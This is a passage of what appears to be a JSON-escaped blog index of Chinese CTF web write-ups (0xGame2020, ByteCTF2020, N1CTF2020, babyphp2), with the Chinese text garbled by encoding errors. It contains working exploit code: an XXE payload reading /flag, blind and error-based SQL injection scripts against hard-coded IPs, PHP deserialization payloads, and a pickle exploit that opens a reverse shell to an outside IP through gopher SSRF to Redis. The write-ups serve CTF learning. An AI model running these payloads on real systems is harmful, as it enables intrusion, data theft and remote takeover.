version=\u0026quot;1.0\u0026quot;?\u0026gt;\r\u0026lt;!DOCTYPE dy [\r\u0026lt;!ENTITY dy SYSTEM \u0026quot;file:///flag\u0026quot;\u0026gt;\r]\u0026gt;\r\u0026lt;user\u0026gt;\u0026lt;username\u0026gt;\u0026amp;dy;\u0026lt;/username\u0026gt;\u0026lt;password\u0026gt;123\u0026lt;/password\u0026gt;\u0026lt;/user\u0026gt;\rclose_eyes å¸ƒå°”ç›²æ³¨å¾ˆå¤šåŒå­¦ç”¨æ‰‹æ‰“ï¼Œæœ¬æ¥ç›®çš„æ˜¯æƒ³å«ä½ ä»¬å»å­¦pythonçš„ï¼Œç»“æœç¡¬æ˜¯æ‰‹æ‰“å‡ºæ¥äº†ï¼Œä¸‹æ¬¡å‡ºä¸ª128ä½çš„flagï¼ˆbushi\næœ¬æ¥æƒ³ç¨å¾®åŠ ç‚¹wafçš„ï¼Œåæ¥ä¸æƒ³å‡ºéš¾äº†å°±æ²¡åŠ ï¼Œå¼€SQLmapçš„è«å¾—çµé­‚ã€‚\nå¸ƒå°”ç›²æ³¨å­¦ä¹ ï¼šhttps://xz.aliyun.com/t/7169#toc-2\nè¿™ç¯‡æ–‡ç« ä¸ä»…ä»…è®²äº†ç›²æ³¨ä¹Ÿè®²äº†å…¶ä»–çš„ä¸€äº›æ‰‹æ³•ï¼Œå€¼å¾—é’»ç ”ä¸€ç•ª\næ€è·¯å°±æ˜¯è¯­å¥ä¸ºå‡çš„æ—¶å€™ï¼ˆæ¯”å¦‚æˆ‘ç”¨æˆ·åè¾“å…¥1'||1=0#æˆ–è€…ä¹±è¾“ä¸€ä¸ªç”¨æˆ·åå¯†ç ï¼‰ï¼Œé¡µé¢å›æ˜¾â€œæ•°æ®åº“é‡Œæ²¡ä½ è¿™å·äºº,åˆ«æƒ³éª—åŠ³èµ„.jpgâ€\nä¸ºçœŸçš„æ—¶å€™ï¼ˆæ¯”å¦‚æˆ‘è¾“å…¥1'||1=1#ï¼‰é¡µé¢å›æ˜¾â€œæ•°æ®åº“æœ‰ä½ è¿™å·äººï¼Œé‚£åˆæ€ä¹ˆç€ï¼Ÿâ€ï¼Œæ ¹æ®å›æ˜¾æƒ…å†µçš„ä¸åŒï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ¤æ–­æˆ‘ä»¬çš„conditionç©¶ç«Ÿæ˜¯çœŸè¿˜æ˜¯å‡ã€‚\n1'||(condition)#\rä¸æ–­åœ°æ”¹å˜conditionå°±å¯ä»¥æŸ¥åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ï¼›\nä¸¾ä¸ªä¾‹å­ï¼š\n1'||length(database())\u0026gt;1#\råˆ¤æ–­æ•°æ®åº“åå­—çš„é•¿åº¦æ˜¯ä¸æ˜¯å¤§äº1ï¼Œé¡µé¢è¿”å›â€œæ•°æ®åº“æœ‰ä½ è¿™å·äººï¼Œé‚£åˆæ€ä¹ˆç€ï¼Ÿâ€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šæ•°æ®åº“åå­—é•¿åº¦å¤§äº1ã€‚\nç±»ä¼¼çš„ï¼š\n1'||ascii(substr(database(),1,1))=117#\rå¯åˆ¤æ–­æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯ASCIIç ä¸º117çš„å­—æ¯ï¼Œä¹Ÿå°±æ˜¯â€˜u'ã€‚\nä¹Ÿå¯ä»¥ä½¿ç”¨äºŒåˆ†æ³•è¿›è¡Œç›²æ³¨ã€‚\nexpï¼š\n#python3\r#wh1sper\rimport requests\rhost = 'http://59.110.157.4:30052/login.php'\rdef mid(bot, top):\rreturn (int)(0.5 * (top + bot))\rdef sqli():\rname = ''\rfor j in range(1, 250):\rtop = 126\rbot = 32\rwhile 1:\rbabyselect = 'database()'#user\r#babyselect = '(select table_name from information_schema.tables where table_schema=database())'#user\r#babyselect = \u0026quot;(select group_concat(column_name) from information_schema.columns \u0026quot; \\\r# \u0026quot;where table_schema=database() and table_name='user')\u0026quot;#id,username,password\r#babyselect = \u0026quot;(select group_concat(password) from user)\u0026quot;#0xGame{blind_sqli_1s_not_hard}\rdata = {\r\u0026quot;password\u0026quot;: \u0026quot;1\u0026quot;,\r\u0026quot;username\u0026quot;: \u0026quot;1'||ascii(substr({},{},1))\u0026gt;{}#\u0026quot;.format(babyselect, j, mid(bot, top))\r}\rr = requests.post(url=host, data=data)\r#print(r.text)\rprint(data)\rif 'æ•°æ®åº“æœ‰ä½ è¿™å·äºº' in r.text:#å­æŸ¥è¯¢ä¸ºçœŸ\rif top - 1 == bot:\rname += chr(top)\rprint(name)\rbreak\rbot = mid(bot, top)\relse:\rif top - 1 == bot:\rname += chr(bot)\rprint(name)\rbreak\rtop = mid(bot, top)\rif __name__ == '__main__':\rsqli()\rç¬¬å››å‘¨ broken_motto sessionååºåˆ—åŒ–ï¼Œä¹Ÿæ˜¯æ–‡æ¡£é‡Œé¢å‡ºç°è¿‡çš„\n\u0026gt;\u0026gt;å­¦ä¹ é“¾æ¥ï¼Œå»ºè®®è‡ªå·±æœ¬åœ°åŠ¨æ‰‹æ­ä¸€ä¸ªç¯å¢ƒ\nåœ¨profile.phpé‡Œé¢é‡Œé¢æœ‰ä¸€è¡Œæ³¨é‡Šï¼š\n//ini_set('session.serialize_handler','php_serialize');\rè¿™è¡Œä»£ç ä½¿ç”¨çš„Sessionåºåˆ—åŒ–é€‰æ‹©å™¨æ˜¯php_serializeï¼Œæ³¨é‡Šä¹‹åé»˜è®¤ä½¿ç”¨çš„æ˜¯php\nä¸¤ç§é€‰æ‹©å™¨çš„ä¸åŒçš„å¤„ç†æ–¹å¼å¯¼è‡´äº†sessionååºåˆ—åŒ–çš„æ¼æ´çš„äº§ç”Ÿï¼Œå­˜sessionçš„æ—¶å€™ï¼Œå­˜å…¥php_serializeç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„æ•°ç»„\nè¯»å–çš„æ—¶å€™phpä»¥é”®å ï¼‹ ç«–çº¿ ï¼‹ ç»è¿‡ serialize() å‡½æ•°åºåˆ—åŒ–çš„æ•°æ®å¤„ç†å¦‚æœä½ æ³¨å†Œçš„æ—¶å€™åŠ ä¸€ä¸ª|ï¼Œä»–ä¼šæŠŠ|å‰é¢çš„å¿½ç•¥æ‰ï¼Œåªååºåˆ—åŒ–åé¢çš„ï¼Œå°±å¯ä»¥é€ æˆå¯¹è±¡æ³¨å…¥ã€‚\nexpï¼š\n\u0026lt;?php\rclass info{\rpublic $admin;\rpublic $username;\rpublic $motto;\r}\r$pop = new info();\r$pop-\u0026gt;admin = 1;\recho serialize($pop);\rpayloadï¼š\n|O:4:\u0026quot;info\u0026quot;:3:{s:5:\u0026quot;admin\u0026quot;;i:1;s:8:\u0026quot;username\u0026quot;;N;s:5:\u0026quot;motto\u0026quot;;N;}\rè¿™æ¬¡æ¯”èµ›æ€»çš„æ¥è¯´å‘¢ï¼Œè¿˜æ˜¯å¾ˆæˆåŠŸçš„ï¼Œç›¸ä¿¡åŒå­¦ä»¬éƒ½æ‰¾åˆ°äº†è‡ªå·±å¿ƒé‡Œä¸€ç›´æƒ³è¿½æ±‚çš„æ–¹å‘ï¼Œå½“ç„¶ï¼Œæ¯”èµ›ä¸­ä¹Ÿä¸ä¹è¡¨ç°çªå‡ºçš„é€‰æ‰‹ï¼Œå¸Œæœ›ä½ ä»¬èƒ½åšæŒä¸‹å»ï¼Œå»è¿½æ±‚æ›´æ·±çš„æŠ€æœ¯ï¼Œæ›´å¥½çš„æœªæ¥\n","date":"2020-10-30T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120181429.png","permalink":"https://anthem-whisper.github.io/p/0xgame2020%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/","title":"0xGame2020å‡ºé¢˜ç¬”è®°"},{"content":"è¿™æ¬¡ByteCTF2020çš„webé¢˜ç›®éå¸¸é¡¶ï¼Œç¬¬ä¸€å¤©æ¯”èµ›å¿«ç»“æŸçš„æ—¶å€™å…¨åœºwebæ‰æœ‰äº†ç¬¬ä¸€ä¸ªè§£ï¼Œåæ¥è§£äººæ•°æœ€å¤šçš„XSSä¹Ÿå°±ä¸è¿‡åä¸ªè§£ï¼Œå¯æƒœä¸€ç›´åœ¨çœ‹çˆ¬è™«çš„é¢˜ï¼Œæœ€åè¿˜æ˜¯æ²¡åšå‡ºã€‚\n easy_scrapy è€ƒç‚¹ï¼šMD5çˆ†ç ´ã€SSRF\nåŠŸèƒ½æ˜¯æ·»åŠ ä¸€ä¸ªhttp://æˆ–è€…https://å¼€å¤´çš„URLï¼Œå¹¶ä¸”è¦æ±‚è¾“å…¥éªŒè¯ç ï¼Œå¯ä»¥åˆ©ç”¨ä»¥ä¸‹è„šæœ¬æ¥çˆ†ç ´ï¼š\nimport hashlib\rfor i in range(99999999):\rif hashlib.md5(str(i).encode('UTF-8')).hexdigest()[:6] == '2c97b3':\rprint(i)\rbreak\råå‡ ç§’èƒ½å‡ºç»“æœï¼Œä¹‹åå¯ä»¥BPé‡æ”¾æ•°æ®åŒ…æ¥å¿«é€Ÿçš„æ·»åŠ ã€‚\næ·»åŠ æˆåŠŸä¹‹åå¯ä»¥åœ¨MyUrlListé‡Œé¢çœ‹åˆ°æ·»åŠ è®°å½•ï¼Œç‚¹è¿›å»å¯ä»¥çœ‹åˆ°çˆ¬å–åˆ°çš„ä¸œè¥¿ã€‚\nç›‘å¬ç«¯å£æ¥æ”¶åˆ°è¯·æ±‚ï¼š\nGET / HTTP/1.1\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: en\rUser-Agent: scrapy_redis\rAccept-Encoding: gzip, deflate\rå‘ç°æ˜¯scrapy_redisï¼Œåˆæ­¥çŒœæµ‹æ˜¯SSRFæ‰“redisã€‚\næ—¢ç„¶ä»–æ˜¯çˆ¬è™«ï¼Œé‚£ä¹ˆé‡åˆ°ç±»ä¼¼äºè¿™ç§æ ‡ç­¾çš„è¯ï¼Œä»–å¾ˆæœ‰å¯èƒ½å°±ä¼šå»è¯·æ±‚ï¼Œï¼ˆåæ¥æ”¾äº†HINTï¼Œå«å»è¯»è¿™ä¸ªé¡µé¢çš„æºç ï¼‰å°è¯•çˆ¬ä»¥ä¸‹è¿™é“é¢˜çš„å…¬ç½‘IPï¼Œå‘ç°ä»–ä¼šæŠŠ/listçš„æºç ä¸€å¹¶çˆ¬ä¸‹æ¥ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥èµ·ä¸€ä¸ªé¡µé¢æ¥æŒ‡å‘file:///etc/passwd\næ¯”èµ›çš„æ—¶å€™æˆ‘ç”¨çš„æ˜¯302é‡å®šå‘å¥½åƒä¸è¡Œï¼ˆå“­äº†ï¼‰ï¼Œå…¶å®è¿™é‡Œä»–é‡åˆ°ä¸€ä¸ªæ ‡ç­¾å°±ä¼šå»è¯·æ±‚ï¼š\næˆ‘ä»¬å¯ä»¥å‘ç°ä»–è¯·æ±‚åˆ°äº†æˆ‘ä»¬æƒ³è¦çš„URLï¼š\næŠŠæ ‡ç­¾çš„hrefæ”¹æˆfileåè®®æœç„¶å¯ä»¥é€ æˆä»»æ„æ–‡ä»¶è¯»ï¼š\nè¿™æ ·çš„è¯æˆ‘ä»¬å¯ä»¥é€ä¸€çš„è¯»å–ä»–çˆ¬è™«çš„æºç ï¼Œä½†æ˜¯åœ¨è¿™ä¹‹å‰æˆ‘ä»¬è¦å…ˆçŸ¥é“çˆ¬è™«å·¥ä½œçš„ç»å¯¹è·¯å¾„ï¼Œå¯ä»¥é€šè¿‡è¯»/proc/self/environï¼Œå¾—åˆ°ç»å¯¹è·¯å¾„PWD=/codeï¼Œè¿™ä¸ªçŸ¥è¯†ç‚¹åœ¨æœ¬ç«™[SWPU2019]Web3ä¹Ÿæåˆ°è¿‡ã€‚\nåœ¨å®˜æ–¹æ–‡æ¡£ä¸­æ‰¾åˆ°äº†è¿™ä¸ªçˆ¬è™«æ¡†æ¶çš„ç»“æ„ï¼š\ntutorial/\rscrapy.cfg\rtutorial/\r__init__.py\ritems.py\rpipelines.py\rsettings.py\rspiders/\r__init__.py\r...\ræˆ‘ä»¬å°è¯•å»è¯»å–è¿™äº›æ–‡ä»¶ï¼›\nscrapy.cfg:\n# Automatically created by: scrapy startproject\r#\r# For more information about the [deploy] section see:\r# https://scrapyd.readthedocs.io/en/latest/deploy.html\r[settings]\rdefault = bytectf.settings\r[deploy]\r#url = http://localhost:6800/\rproject = bytectf\rå¯¹ç…§ç€æ–‡æ¡£æˆ‘ä»¬å¯ä»¥çœ‹åˆ°é¡¹ç›®æ–‡ä»¶å¤¹çš„åç§°æ˜¯bytectfï¼Œä¸è¿‡åœ¨bytectf/spideræ–‡ä»¶å¤¹ä¸‹çš„çˆ¬è™«åç§°å´ä¼¼ä¹æ˜¯è‡ªå®šä¹‰çš„åå­—ã€‚\nè¯»å–/proc/self/cmdlineï¼Œè¿™ä¸ªæ–‡ä»¶åŒ…å«è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤è¡Œä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ä»–æ¥å¾—çŸ¥æ­£åœ¨è¿è¡Œçš„çˆ¬è™«çš„æ–‡ä»¶åç§°ã€‚\n/usr/local/bin/python /usr/local/bin/scrapy crawl byte\rå¾—çŸ¥çˆ¬è™«åå­—å«åšbyteã€‚\nè¯»å–ä¹‹ï¼Œå¾—åˆ°æºç ï¼Œç»“æ„å¤§æ¦‚å¦‚ä¸‹ï¼š\n/code/\rrequirement.txt\rscrapy.cfg\rbytectf/\r__init__.py items.py pipelines.py settings.py spiders/ __init__.py byte.py\rç”±æºç å¯çŸ¥ï¼š\n172.20.0.8:6379ä¸ºå†…ç½‘Redis\r172.20.0.7:27017ä¸ºmongodb\ræ‰“ä¸€é€šä¹‹åæ²¡æœ‰ä»»ä½•å›æ˜¾ï¼Œç”šè‡³ä¸èƒ½ç¡®å®šè¿™ä¸¤ä¸ªä¸»æœºæ˜¯å¦å­˜æ´»ã€‚\næ ¹æ®hintï¼Œå¾—åˆ°æºç ä¹‹åæˆ‘ä»¬å¯ä»¥æœ¬åœ°èµ·ä¸€ä¸ªç¯å¢ƒæ¥è°ƒè¯•ï¼ŒåŒæ—¶ï¼Œä»è¿™ç¯‡æ–‡ç« é‡Œé¢æˆ‘ä»¬å¾—çŸ¥redis-scrapyçš„è¿ä½œæ–¹å¼:\nä½œä¸ºä¸€ä¸ªåˆ†å¸ƒå¼çˆ¬è™«ï¼Œæ˜¯éœ€è¦æœ‰ä¸€ä¸ªMasterç«¯ï¼ˆæ ¸å¿ƒæœåŠ¡å™¨ï¼‰çš„ï¼Œåœ¨Masterç«¯ï¼Œä¼šæ­å»ºä¸€ä¸ªRedisæ•°æ®åº“ï¼Œç”¨æ¥å­˜å‚¨start_urlsã€requestã€itemsã€‚Masterçš„èŒè´£æ˜¯è´Ÿè´£urlæŒ‡çº¹åˆ¤é‡ï¼ŒRequestçš„åˆ†é…ï¼Œä»¥åŠæ•°æ®çš„å­˜å‚¨ï¼ˆä¸€èˆ¬åœ¨Masterç«¯ä¼šå®‰è£…ä¸€ä¸ªmongodbç”¨æ¥å­˜å‚¨redisä¸­çš„itemsï¼‰ã€‚å‡ºäº†Masterä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªè§’è‰²å°±æ˜¯slaverï¼ˆçˆ¬è™«ç¨‹åºæ‰§è¡Œç«¯ï¼‰ï¼Œå®ƒä¸»è¦è´Ÿè´£æ‰§è¡Œçˆ¬è™«ç¨‹åºçˆ¬å–æ•°æ®ï¼Œå¹¶å°†çˆ¬å–è¿‡ç¨‹ä¸­æ–°çš„Requestæäº¤åˆ°Masterçš„redisæ•°æ®åº“ä¸­ã€‚\nè¿™å’Œæˆ‘ä»¬ä¹‹å‰çš„çŒœæƒ³SSRF+Redisæ˜¯è¶Šæ¥è¶Šæ¥è¿‘çš„ã€‚\nä½†æ˜¯ç”¨ç”¨çˆ¬è™«å»æ‰“Redisæ˜¯æ‰“ä¸åˆ°ä¸œè¥¿çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æºç é‡Œé¢çœ‹åˆ°scrapy.Requestï¼Œä»–æ˜¯ä¸æ”¯æŒgopherå’Œdictåè®®çš„ã€‚\nå“ªé‡Œè¿˜æœ‰SSRFçš„ç‚¹å‘¢ï¼Ÿ\nå½“ç„¶æ˜¯åœ¨ç‚¹å‡»çˆ¬å–é“¾æ¥çš„æ—¶å€™ï¼š\n?url=https://baidu.com\rç›‘å¬åˆ°è¯·æ±‚çš„UAæ˜¯PycURLï¼Œè¿™ä¸ªä¸œè¥¿å’Œcurlå·®ä¸å¤šï¼Œæ˜¯æ”¯æŒgopherç­‰åè®®çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™é‡Œå»æ‰“redisã€‚\nä¸è¿‡é—æ†¾çš„æ˜¯ï¼Œè¿™é‡Œçš„æ˜¯ssrfä»ç„¶æ˜¯æ²¡æœ‰å›æ˜¾ï¼Œéš¾ä»¥åˆ¤æ–­æˆ‘ä»¬çš„payloadæ˜¯å¦èµ·ä½œç”¨ã€‚\næ­¤é¢˜æœ€éš¾å‘ç°çš„ç‚¹æˆ‘æ„Ÿè§‰å°±æ˜¯è¿™ä¸ªpickleååºåˆ—åŒ–ï¼Œæ­¤æ—¶æœ‰ä¸¤ç§å‘ç°pickleååºåˆ—åŒ–çš„æ–¹æ³•ï¼š\n1.æœ¬åœ°èµ·ä¸€ä¸ªscrapy_redisç¯å¢ƒï¼Œå»çœ‹redisé‡Œé¢çš„ä¸œè¥¿ï¼Œå‘ç°åºåˆ—åŒ–æ•°æ®ï¼ˆæ“ä½œæœ‰éš¾åº¦ï¼Œä¹Ÿè®¸ä¼šé‡åˆ°å¾ˆå¤šé—®é¢˜ï¼‰\n2.çˆ¬è™«ç¬¬4è¡Œä½¿ç”¨äº†scrapy_redisåº“ï¼Œå»çœ‹è¿™ä¸ªçš„æºç ï¼Œå¯ä»¥å‘ç°å®ƒåœ¨å­˜å–æ•°æ®çš„è¿‡ç¨‹ä¸­ä½¿ç”¨äº†pickleçš„åºåˆ—åŒ–æ–¹å¼ï¼Œå¹¶ä¸”è¿˜å¯ä»¥å‘ç°ï¼Œå®ƒä¼šå°†requestå¯¹è±¡å­˜å…¥çˆ¬è™«å:requestsè¿™æ ·çš„æœ‰åºåˆ—è¡¨ä¸­ã€‚\næ—¢ç„¶æœ‰åºåˆ—åŒ–é‚£å¿…ç„¶å­˜åœ¨ååºåˆ—åŒ–ï¼Œåˆ©ç”¨ååºåˆ—åŒ–æ¥åå¼¹shellã€‚\nbyte:requestsæœ‰åºåˆ—è¡¨æ˜¯zsetçš„ï¼Œæˆ‘ä»¬gopheræ‰“çš„æ—¶å€™éœ€è¦zsetã€‚\nè´´ä¸€ä¸ªå®˜æ–¹expï¼š\nimport pickle\rimport os\rfrom urllib.parse import quote\rclass exp(object):\rdef __reduce__(self):\rs = \u0026quot;\u0026quot;\u0026quot;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026quot;119.45.184.10\u0026quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026quot;/bin/sh\u0026quot;,\u0026quot;-i\u0026quot;]);'\u0026quot;\u0026quot;\u0026quot;\rreturn (os.system, (s,))\rtest = str(pickle.dumps(exp()))\rpoc = test.replace(\u0026quot;\\n\u0026quot;,'\\\\n').replace(\u0026quot;\\\u0026quot;\u0026quot;,\u0026quot;\\\\\\\u0026quot;\u0026quot;)[2:-1]\rpoc ='gopher://172.20.0.7:6379/_'+quote('ZADD byte:requests 0 \u0026quot;')+quote(poc)+quote('\u0026quot;')\rprint(poc)\ræ—¶é—´æ˜¾å¾—æœ‰ç‚¹æ€¥ï¼Œè¿™é“é¢˜å°±è‰è‰çš„å¤ç°äº†ä¸€éï¼Œä»¥åæ—¶é—´å†æœ¬åœ°æ·±ç©¶\n","date":"2020-10-28T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210228105539.jpeg","permalink":"https://anthem-whisper.github.io/p/bytectf2020%E5%A4%8D%E7%8E%B0/","title":"ByteCTF2020å¤ç°"},{"content":"N1CTFæ‰“ä¸è¿‡æ ¹æœ¬æ‰“ä¸è¿‡ï¼Œå°±åšäº†ä¸ªç­¾åˆ°\n SignIn è€ƒç‚¹ï¼šååºåˆ—åŒ–ï¼Œå¸ƒå°”ç›²æ³¨ï¼ŒæŠ¥é”™æ³¨å…¥\nè¿™æ˜¯æºç ï¼š\n\u0026lt;?php\rhighlight_file(__FILE__);\rclass ip {\rpublic $ip;\rpublic function waf($info){\r}\rpublic function __construct() {\rif(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){\r$this-\u0026gt;ip = $this-\u0026gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']);\r}else{\r$this-\u0026gt;ip =$_SERVER[\u0026quot;REMOTE_ADDR\u0026quot;];\r}\r}\rpublic function __toString(){\r$con=mysqli_connect(\u0026quot;localhost\u0026quot;,\u0026quot;root\u0026quot;,\u0026quot;********\u0026quot;,\u0026quot;n1ctf_websign\u0026quot;);\r$sqlquery=sprintf(\u0026quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')\u0026quot;,$this-\u0026gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());\rif(!mysqli_query($con,$sqlquery)){\rreturn mysqli_error($con);\r}else{\rreturn \u0026quot;your ip looks ok!\u0026quot;;\r}\rmysqli_close($con);\r}\r}\rclass flag {\rpublic $ip;\rpublic $check;\rpublic function __construct($ip) {\r$this-\u0026gt;ip = $ip;\r}\rpublic function getflag(){\rif(md5($this-\u0026gt;check)===md5(\u0026quot;key****************\u0026quot;)){\rreadfile('/flag');\r}\rreturn $this-\u0026gt;ip;\r}\rpublic function __wakeup(){\rif(stristr($this-\u0026gt;ip, \u0026quot;n1ctf\u0026quot;)!==False)\r$this-\u0026gt;ip = \u0026quot;welcome to n1ctf2020\u0026quot;;\relse\r$this-\u0026gt;ip = \u0026quot;noip\u0026quot;;\r}\rpublic function __destruct() {\recho $this-\u0026gt;getflag();\r}\r}\rif(isset($_GET['input'])){\r$input = $_GET['input'];\runserialize($input);\r}\ræ€è·¯æ˜¯åˆ©ç”¨stristrå‡½æ•°è§¦å‘__toStringï¼Œç„¶ååœ¨XFFå¤´æ¥è¿›è¡Œä¸€ä¸ªsqlæ³¨å…¥\n$pop = new flag();\r$pop-\u0026gt;ip = new ip();\recho serialize($pop);\ré¡µé¢å›æ˜¾å°±åªä¼šæœ‰noipå’Œwelcome to n1ctf2020ä¸¤ç§ï¼Œå› ä¸º__toStringæ–¹æ³•é‡Œé¢åªæœ‰returnï¼Œæ‰€ä»¥æˆ‘ä»¬å¹¶ä¸èƒ½ç›´æ¥çœ‹åˆ°mysqlçš„å›æ˜¾ï¼ˆæ— è®ºæˆåŠŸä¸å¦ï¼‰ï¼Œåªèƒ½åˆ©ç”¨ä¸¤ç§å›æ˜¾æ¥åˆ¤æ–­æˆ‘ä»¬çš„sqlè¯­å¥æ˜¯å¦é€»è¾‘æ­£ç¡®ã€‚\nç®€å•fuzzäº†ä¸€ä¸‹ï¼Œè¿‡æ»¤äº†likeã€sleepã€BENCHMARKï¼Œä¸èƒ½å»¶æ—¶æ³¨å…¥ã€‚\nå› ä¸ºä»–return mysqli_error($con);è¿”å›äº†MySQLçš„æŠ¥é”™ä¿¡æ¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æŠ¥é”™æ³¨å…¥ï¼›\n' or updatexml(1,concat(0x7e,(select if((1=1),'n1ctf',0)),0x7e),1) or '\r1=1å’Œ1=0åˆ†åˆ«è¿”å›äº†ä¸åŒçš„ä¿¡æ¯ã€‚\nexpï¼š\nimport requests\rurl = 'http://101.32.205.189/index.php?input=O:4:\u0026quot;flag\u0026quot;:2:{s:2:\u0026quot;ip\u0026quot;;O:2:\u0026quot;ip\u0026quot;:1:{s:2:\u0026quot;ip\u0026quot;;i:1;}s:5:\u0026quot;check\u0026quot;;s:4:\u0026quot;test\u0026quot;;}'\rresult = ''\rreq = requests.session()\rfor x in range(1, 50):\rhigh = 127\rlow = 32\rmid = (low + high) // 2\rwhile high \u0026gt; low:\r#babyselect = \u0026quot;database()\u0026quot;#n1ctf_websign\r#babyselect = \u0026quot;(select group_concat(table_name) from information_schema.tables where table_schema=database())\u0026quot;#n1ip,n1key\r#babyselect = \u0026quot;(select group_concat(column_name) from information_schema.columns where table_name='n1key')\u0026quot;#id,key\rbabyselect = \u0026quot;(select `key` from n1key)\u0026quot;#n1ctf20205bf75ab0a30dfc0c\rselect = \u0026quot;ascii(substr({},{},1))\u0026gt;{}\u0026quot;.format(babyselect, x, mid)\rpayload = \u0026quot;' or updatexml(1,concat(0x7e,(select if(({}),'n1ctf',0)),0x7e),1) or '\u0026quot;.format(select)\rdata = {\u0026quot;X-Forwarded-For\u0026quot;: payload}\rresp = requests.get(url, headers=data) #GET:params=data POST:data=data\rprint(payload)\rif resp.text.count('welcome to n1ctf2020') == 2: #\rlow = mid + 1\relse:\rhigh = mid\rmid = (low + high) // 2\r# print(mid)\rresult += chr(int(mid))\rprint(result)\rprint(\u0026quot;end.......\u0026quot;)\rprint(result)\rkeyæ˜¯å…³é”®å­—ï¼Œåªèƒ½select key\nå¾—åˆ°keyï¼šn1ctf20205bf75ab0a30dfc0c\n$pop = new flag();\r$pop-\u0026gt;ip = new ip();\r$pop-\u0026gt;check = \u0026quot;n1ctf20205bf75ab0a30dfc0c\u0026quot;;\recho serialize($pop);\rä¼ å‚å¾—åˆ°ï¼š\nn1ctf{you_g0t_1t_hack_for_fun}\n","date":"2020-10-20T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/n1ctf2020/","title":"N1CTF2020"},{"content":"babyphp2 è€ƒç‚¹ï¼špharååºåˆ—åŒ–ã€popé“¾ã€compress.zlib://phar://ç»•è¿‡^phar\nPaperï¼šhttps://paper.seebug.org/680/\né¢˜ç›®ä¸€å¼€å§‹æœ‰www.zipç»™äº†æºä»£ç ï¼Œä¸‹è½½è¿‡æ¥å®¡è®¡;\nå¤§æ¦‚æ˜¯æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼šæ–‡ä»¶ä¸Šä¼ ã€æ–‡ä»¶è¯»å–ã€SQLæŸ¥è¯¢ï¼ˆç™»å½•æ¡†ï¼‰\npharååºåˆ—åŒ– æˆ‘ä»¬å¯ä»¥çœ‹åˆ°class.phpé‡Œé¢æœ‰å¾ˆå¤šçš„ç±»ï¼Œå¯ä»¥æƒ³åˆ°å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–ï¼Œä½†æ˜¯åœ¨æºç é‡Œé¢æ²¡æœ‰unserializeçš„æ“ä½œã€‚ä¸è¿‡ï¼Œä»–æœ‰ä¸€ä¸ªåŠŸèƒ½æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‡ªç„¶è€Œç„¶çš„æƒ³åˆ°äº†pharååºåˆ—åŒ–ã€‚\nclass.php\n\u0026lt;?php\rerror_reporting(0);\rsession_start();\rclass User\r{\rpublic $id;\rpublic $age=null;\rpublic $nickname=null;\rpublic $backup;\rpublic function login() {\rif(isset($_POST['username'])\u0026amp;\u0026amp;isset($_POST['password'])){\r$mysqli=new dbCtrl();\r$this-\u0026gt;id=$mysqli-\u0026gt;login();\rif($this-\u0026gt;id){\r$_SESSION['id']=$this-\u0026gt;id;\r$_SESSION['login']=1;\recho \u0026quot;ä½ çš„IDæ˜¯\u0026quot;.$_SESSION['id'];\recho \u0026quot;ä½ å¥½ï¼\u0026quot;.$_SESSION['token'];\recho \u0026quot;\u0026lt;script\u0026gt;window.location.href='upload.php'\u0026lt;/script\u0026gt;\u0026quot;;\r}\r}\r}\rpublic function upload(){\r$uploader=new Upload();\r$uploader-\u0026gt;upload();\r}\rpublic function read(){\r$reader=new reader();\r$reader-\u0026gt;read($_POST['filename']);\r}\rpublic function __toString()\r{\r$this-\u0026gt;nickname-\u0026gt;backup=$this-\u0026gt;backup;\r$user = new User();\r$user-\u0026gt;id = $_SESSION['id'];\r$user-\u0026gt;nickname = $_SESSION['token'];\rreturn serialize($user);\r}\r}\rclass dbCtrl\r{\rpublic $hostname=\u0026quot;127.0.0.1\u0026quot;;\rpublic $dbuser=\u0026quot;p3rh4ps\u0026quot;;\rpublic $dbpass=\u0026quot;p3rh4ps\u0026quot;;\rpublic $database=\u0026quot;p3rh4ps\u0026quot;;\rpublic $name;\rpublic $password;\rpublic $mysqli;\rpublic $token;\rpublic function __construct()\r{\r$this-\u0026gt;name=$_POST['username'];\r$this-\u0026gt;password=$_POST['password'];\r}\rpublic function login()\r{\r$this-\u0026gt;mysqli=new mysqli($this-\u0026gt;hostname, $this-\u0026gt;dbuser, $this-\u0026gt;dbpass, $this-\u0026gt;database);\rif ($this-\u0026gt;mysqli-\u0026gt;connect_error) {\rdie(\u0026quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:\u0026quot; . $this-\u0026gt;mysqli-\u0026gt;connect_error);\r}\r$sql=\u0026quot;select id,password from users where username=?\u0026quot;;\r$result=$this-\u0026gt;mysqli-\u0026gt;prepare($sql);\r$result-\u0026gt;bind_param('s', $this-\u0026gt;name);\r$result-\u0026gt;execute();\r$result-\u0026gt;bind_result($idResult, 